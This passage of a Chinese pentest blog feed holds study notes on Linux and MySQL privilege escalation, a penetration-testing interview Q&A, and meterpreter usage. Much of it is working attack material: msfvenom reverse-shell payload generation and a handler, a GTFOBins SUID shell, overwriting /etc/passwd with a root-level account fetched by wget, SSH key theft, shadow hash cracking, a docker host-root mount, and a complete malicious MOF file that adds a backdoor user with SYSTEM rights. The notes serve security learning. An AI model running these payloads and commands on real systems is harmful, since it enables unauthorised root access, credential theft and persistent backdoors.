shell.php<br></code></pre></td></tr></table></figure><p><strong>本地监听器</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload php/meterpreter_reverse_tcp<br><span class="hljs-built_in">set</span> lhost xxx<br><span class="hljs-built_in">set</span> lport xxx<br>exploit<br></code></pre></td></tr></table></figure><p><strong>msf本地提权(也可以使用shell执行命令)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><h5 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权 :"></a>Suid提权 :</h5><p>​<strong>SUID是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。也就是如果ROOT用户给某个可执行文件加了S权限，那么该执行程序运行的时候将拥有ROOT权限。</strong></p><p>​</p><p><strong>设置SUID</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename   设置SUID位<br><span class="hljs-built_in">chmod</span> u-s filename   去掉SUID设置<br></code></pre></td></tr></table></figure><p>​</p><p>​<strong>以下命令可以发现系统上运行的所有SUID可执行文件</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000-print2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000-exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>&#x2F;表示从文件系统的顶部（根）开始并找到每个目录<br>-perm 表示搜索随后的权限<br>-u &#x3D; s表示查找root用户拥有的文件<br>-type表示我们正在寻找的文件类型<br>f 表示常规文件，而不是目录或特殊文件<br>2表示该进程的第二个文件描述符，即stderr（标准错误）</p><p><strong>查找后,找到对应的网站进行提权查询</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//g</span>tfobins.github.io/<br></code></pre></td></tr></table></figure><p>例如 : <strong>find</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> . -exec <span class="hljs-regexp">/bin/</span>sh -p \; -quit<br>cat <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure><h5 id="常见的suid提权"><a href="#常见的suid提权" class="headerlink" title="常见的suid提权 :"></a>常见的suid提权 :</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span>、<span class="hljs-keyword">vim</span>、<span class="hljs-keyword">find</span>、more、less、bash、<span class="hljs-keyword">cp</span>、Nano、mv、awk、man、weget<br></code></pre></td></tr></table></figure><h5 id="Passwd提权"><a href="#Passwd提权" class="headerlink" title="Passwd提权 :"></a>Passwd提权 :</h5><p>利用前提是 : 如何Passwd普通用户可写的情况下,我们是可以追加进我们的账号,实现登录.</p><p><strong>通过OpenSSL passwd生成一个新的用户hejun，密码为123456</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt hejun <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>$1$hejun$4o50Z4aoUGaLMC0Rg4Io40</p><p>将其追加到kali的&#x2F;etc&#x2F;passwd文件中(可以先将对面的Passwd文件复制出来,配置好之后在追加)</p><p><strong>将hejun:$1$hejun$0vnQaCNuzDe3w9d6jHfXQ0:0:0:&#x2F;root:&#x2F;bin&#x2F;bash追加到passwd中</strong></p><p><strong>Python启动一个临时文件服务器</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.xxx<span class="hljs-regexp">/passwd -O /</span>etc/passwd<br></code></pre></td></tr></table></figure><p>增加成功后,可以使用su进行切换测试, 如果bash不方便 , 可以使用ssh进行登录.</p><h5 id="ssh密钥提权"><a href="#ssh密钥提权" class="headerlink" title="ssh密钥提权 :"></a>ssh密钥提权 :</h5><p>PS :创建用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">创建用户名为 <span class="hljs-keyword">user</span> <span class="hljs-title">的用户</span><br><span class="hljs-title">1</span>.进入root权限账号<br>su<br><span class="hljs-number">2</span>.添加普通用户名<br>useradd <span class="hljs-keyword">user</span><br><span class="hljs-title">3</span>.设置普通用户密码<br>passwd <span class="hljs-keyword">user</span><br><span class="hljs-title">4</span>.修改用户登入后所使用的shell<br>usermod -s /bin/bash <span class="hljs-keyword">user</span><br><span class="hljs-title">5</span>.设置家目录<br>usermod -d /home/<span class="hljs-keyword">user</span> <span class="hljs-title">user</span><br><span class="hljs-number">6</span>.创建家目录目录<br>mkdir /home/<span class="hljs-keyword">user</span><br><span class="hljs-title">7</span>.改变目录拥有者和组，（将/home/user下的所有文件的用户组改成user用户组下面的user用户）<br>chown -R user:<span class="hljs-keyword">user</span> <span class="hljs-title">/home</span>/<span class="hljs-keyword">user</span><span class="hljs-title"></span><br></code></pre></td></tr></table></figure><p>先找出能登陆的用户</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/etc/</span>passwd | <span class="hljs-keyword">grep</span> bash<br></code></pre></td></tr></table></figure><p>查看对方目录下是否有自动登录的公钥和私钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/home/</span>xxx/.ssh<br></code></pre></td></tr></table></figure><p>发现存在的情况下 :</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>. cat id_rsa (保存在自己本地,并取名为 id_rsa )<br><br><span class="hljs-symbol">2 </span>. chmod <span class="hljs-number">600</span> id_rsa<br></code></pre></td></tr></table></figure><p>使用我们刚刚获取到的私钥进行登录测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -i id_rsa xxx@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.xxx<br></code></pre></td></tr></table></figure><h5 id="John破解shadow-root密文登录提权"><a href="#John破解shadow-root密文登录提权" class="headerlink" title="John破解shadow root密文登录提权 :"></a>John破解shadow root密文登录提权 :</h5><p>​<strong>john会自动检测密文类型 –wordlist 字段文件路径如下</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kali自带字典 :   <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt         如果没有解压,手动解压一下.<br></code></pre></td></tr></table></figure><p>例如 : 获取到了root的密码,放进一个文件里面</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$URZ1c7qW$z5jZA6/j9fb8d4ExJOWuwCjEFo0tfBkfV.D3OIf0c0ukepcZYgrBhO6vjpNbmYc<br><span class="hljs-attribute">t1uco9NrtBw3z50tCoMbqb1</span>:<span class="hljs-number">18907</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><p><strong>John破解命令如下 :</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">john --wordlist<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span> userpassw<br></code></pre></td></tr></table></figure><h5 id="计划任务反弹shell提权"><a href="#计划任务反弹shell提权" class="headerlink" title="计划任务反弹shell提权 :"></a>计划任务反弹shell提权 :</h5><p>当获取一个linux普通用户的时，查看计划任务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><p>查看当前用户的计划任务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">crontab -l</span> <br></code></pre></td></tr></table></figure><p><strong>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</strong>   这个目录是root任务文件 , 默认不是root权限是看不到里面的详细内容 </p><p><strong>想一想 , 如果能看到里面执行的计划任务,恰好这个计划任务的文件,又可以被我们控制,那么是不是就意味可以获取到root权限 .</strong></p><p>查看计划任务执行的日志(普通用户也可以执行)</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">tail -f /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/syslog<br></code></pre></td></tr></table></figure><p>如果文件的内容<strong>可控</strong> ,我们就直接修改脚本,反弹shell</p><h5 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权 :"></a>docker 提权 :</h5><p>docker是一个容器 可以在同一台机子虚拟多台服务。<br>输入命令id 和group 查询当前用户信息和组信息 发现存在docker组</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span><br>group<br></code></pre></td></tr></table></figure><p>输入命令挂载到根目录</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -v /:/mnt -<span class="hljs-keyword">it</span> alpine<br></code></pre></td></tr></table></figure><p>切换到mnt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> mnt<br></code></pre></td></tr></table></figure><p>查看shadow密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> etc/shadow<br></code></pre></td></tr></table></figure><h5 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权 :"></a>sudo提权 :</h5><p>sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知道 root 的密码。</p><p>首先通过信息收集，查看是否存在sudo配置不当的可能。如果存在，寻找低权限sudo用户的密码，进而提权。</p><p><strong>查看命令 :</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -l</span><br></code></pre></td></tr></table></figure><p>通常运维会将一些需要 sudo的命令 集成到某个用户或者某个组</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试面试题</title>
    <link href="/2022/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <url>/2022/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>1.为何一个MYSQL数据库的站，只有一个80端口开放?</p><p>2.一个成熟并且相对安全的CMS，渗透时扫目录的意义?</p><p>3.在某后台新闻编辑界面看到编辑器，应该先做什么?</p><p>4.审查上传点的元素有什么意义?</p><p>5.CSRF、XSS及XXE有什么区别，以及修复方式?</p><p>6.3389无法连接的几种情况</p><p>7.列举出owasp top10 2019</p><p>8.说出至少三种业务逻辑漏洞，以及修复方式?</p><p>9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因?</p><p>10.目标站禁止注册用户，找回密码处随便输入用户名提示:“此用户不存在”，你觉得这里怎样利用?</p><h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><p>1.为何一个MYSQL数据库的站，只有一个80端口开放?</p><ul><li>更改了端口，没有扫描出来；</li><li>站库分离；</li><li>3306端口不对外开放。</li></ul><p>2.一个成熟并且相对安全的CMS，渗透时扫目录的意义?</p><ul><li>敏感文件、二级目录扫描；</li><li>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点。</li></ul><p>3.在某后台新闻编辑界面看到编辑器，应该先做什么?</p><ul><li>查看编辑器的名称版本，然后搜索公开的漏洞</li></ul><p>4.审查上传点的元素有什么意义?</p><ul><li>有些站点的上传文件类型限制是在前端实现的，这时候只要增加上传类型就能突破限制了。</li></ul><p>5.CSRF、XSS及XXE有什么区别，以及修复方式?</p><ul><li>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</li><li>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer。</li><li>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</li></ul><p>6.3389无法连接的几种情况</p><ul><li>没有开放3389；</li><li>端口被修改；</li><li>防护拦截；</li><li>处于内网（需要进行端口转发）</li></ul><p>7.列举出owasp top10 2019</p><ul><li>注入</li><li>失效的身份认证</li><li>敏感信息泄露</li><li>XML外部实体(XXE)</li><li>失效的访问控制</li><li>安全配置错误</li><li>跨站脚本(XSS)</li><li>不安全的反序列化</li><li>使用含有已知漏洞的组件</li><li>不足的日志记录和监控</li></ul><p>8.说出至少三种业务逻辑漏洞，以及修复方式?</p><ul><li>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、阔以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码；</li><li>身份认证漏洞中最常见的是会话固定攻击和cookie仿冒，只要得到session或cookie即可伪造用户身份；</li><li>验证码漏洞中存在验证码允许暴力破解、验证码可以通过JavaScript或者改包的方法来绕过。</li></ul><p>9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因?</p><ul><li>原因有很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。</li></ul><p>10.目标站禁止注册用户，找回密码处随便输入用户名提示:“此用户不存在”，你觉得这里怎样利用?</p><ul><li>先爆破用户名,再利用被爆破出来的用户名爆破密码;其实有些站点,在登陆处也会这样提示;所有和数据库交互的地方都有可能有注入。</li></ul>]]></content>
    
    
    <categories>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL提权</title>
    <link href="/2022/10/31/MySQL%E6%8F%90%E6%9D%83/"/>
    <url>/2022/10/31/MySQL%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h3 id="低权限用户提升root"><a href="#低权限用户提升root" class="headerlink" title="低权限用户提升root"></a>低权限用户提升root</h3><h5 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h5><p>已经有一个低权限的webshell,想把低权限用户提升至root。</p><p>1.读取网站数据库配置文件(conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data sql,data,inc,config,conn,database,common,include）</p><p>2.访问数据库安装路径(select @@basedir)下的   mysql&#x2F;user.myd)文件。</p><ul><li>覆盖这三个文件</li><li>读取user.MYD文件，复制这段MD5值去解密（可能不全）</li><li>mysql.ini添加：skip-grant-tables</li></ul><p>直接读取数据库账号密码</p><p>3 . 下载对方 user.frm &#x2F; user.MYD &#x2F; user.MYI 3个数据库文件到本地新建一个数据库,打开对应数据库的文件夹,导入这3张表,即可查看。</p><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031191149773.png" alt="示例"></p><h3 id="MySQL允许远程登陆"><a href="#MySQL允许远程登陆" class="headerlink" title="MySQL允许远程登陆"></a>MySQL允许远程登陆</h3><p>出现%代表可以远程登陆，一般只有三个用户  local host, 127.0.0.1,  ::1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031191529895.png" alt="示例"></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h5 id="定义及使用条件："><a href="#定义及使用条件：" class="headerlink" title="定义及使用条件："></a>定义及使用条件：</h5><p>udf(Userdefined function)是用户自定义函数简写。(意义在于我们可以像使用version()函数一样方便)</p><p>​需要使用root权限，对于5.2以上的版本，将文件udf.dll导出到系统目录下，可以需要使用udf.dll来提权，还需secure_file_priv的设置不为NULL建执行系统命令的函数来调用执行cmd。</p><p>在MySQL高版本中secure-file-priv参数限制了MySQL的导出:</p><ol><li>NULL，表示禁止</li><li>如果value值有文件夹目录，则表示只允许该目录下文件（子目录都不行)</li><li>如果为空(没有值)，则表示不限制目录</li></ol><p>MySQL5.0&#x2F;5.6版本: my.ini中无此参数，查询该参数情况为空，不限制目录</p><p>MySQL5.7版本:my.ini中存在参数，查询该参数情况为NULL，不允许</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">Show <span class="hljs-keyword">VARIABLES</span> like <span class="hljs-comment">&quot;%SECURE%&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031192130859.png" alt="示例"></p><p>现在基本上windows的服务器是以下两个路径导出UDF.DLL</p><p>Mysql版本大于5.1版本。udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。(如果lib目录下没有plugin文件夹,就手动创建一个)</p><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32</p><h5 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h5><ul><li>导入脚本提权: 使用msf自带的udf提权库，进行提权。</li><li>先查询系统是什么版本 ,上传适合的dll包。 – select @@version_compile_os, @@version_compile_machine;</li><li>创建表,添加内容进去。– CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’;</li><li>查询是否添加成功：– select * from mysql.func;</li><li>执行命令 :– select sys_eval(‘whoami’)</li></ul><h5 id="or使用PHP大马提权"><a href="#or使用PHP大马提权" class="headerlink" title="or使用PHP大马提权"></a>or使用PHP大马提权</h5><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031192553805.png" alt="示例"></p><h3 id="MySQL–mof提权"><a href="#MySQL–mof提权" class="headerlink" title="MySQL–mof提权"></a>MySQL–mof提权</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h5><p>​在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h5><ol><li><strong>windows 03及以下版本</strong></li><li>mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</li><li>secure-file-priv参数不为null</li></ol><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h5><p>拿下webshell之后当前权限仅限于对网站文件的操作，想要获取对主机的操作还需进一步提权。</p><p>使用sql语句，通过mysql的dumpfile操作将恶意mof文件拷贝到服务器的c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下，将系统当中默认的nullevt.mof给替换掉，进而让系统执行我们这个恶意的mof文件</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;mof提权文件及路径&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="mof提权代码"><a href="#mof提权代码" class="headerlink" title="mof提权代码"></a>mof提权代码</h5><p><strong>nullevt.mof</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><br>instance of __EventFilter <span class="hljs-keyword">as</span> <span class="hljs-variable">$EventFilter</span><br>&#123;<br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer <span class="hljs-keyword">as</span> <span class="hljs-variable">$Consumer</span><br>&#123;<br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>    ScriptText =<br>    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net user hacker 123456 /add\&quot;)&quot;</span>;<br>    <span class="hljs-comment">//cmd以system权限执行的语句</span><br>&#125;;<br><br>instance of __FilterToConsumerBinding<br>&#123;<br>    Consumer   = <span class="hljs-variable">$Consumer</span>;<br>    Filter = <span class="hljs-variable">$EventFilter</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>再将执行命令net user hacker 123456 &#x2F;add换为net localgroup administrators hacker &#x2F;add即可将hacker用户添加至administrators管理员组。</p><h5 id="安全防范"><a href="#安全防范" class="headerlink" title="安全防范"></a>安全防范</h5><ol><li>对mysql目录权限进行严格限制</li><li>设置复杂的root账号密码</li><li>设置c:&#x2F;windows&#x2F;system32&#x2F;wbem目录为不可写</li></ol><h3 id="反弹提权"><a href="#反弹提权" class="headerlink" title="反弹提权"></a>反弹提权</h3><h5 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h5><ol><li>通过网站无法获取webshell</li><li>Webshell无法执行命令</li><li>有phpmyadmin和root账号，无法查询或者无法获取网站的真实路径</li></ol><h5 id="要求"><a href="#要求" class="headerlink" title="要求:"></a>要求:</h5><ol><li>必须是一个root权限</li><li>能写入相对应的plugin目录</li><li>secure_file_priv 这个参数的值不能为NULL</li></ol><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031193037951.png" alt="示例"></p><hr><p>个人学习小结,具体测试利用方式需根据具体实践场景。</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>meterpreter学习笔记</title>
    <link href="/2022/10/28/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/28/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。"><a href="#mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。" class="headerlink" title="mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。"></a>mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。</h2><span id="more"></span><h4 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作:"></a>基础操作:</h4><p>1 . 生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Linux:<br>msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br><br>Windows:<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br><br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f macho &gt; shell.macho<br><br>PHP:<br>msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw 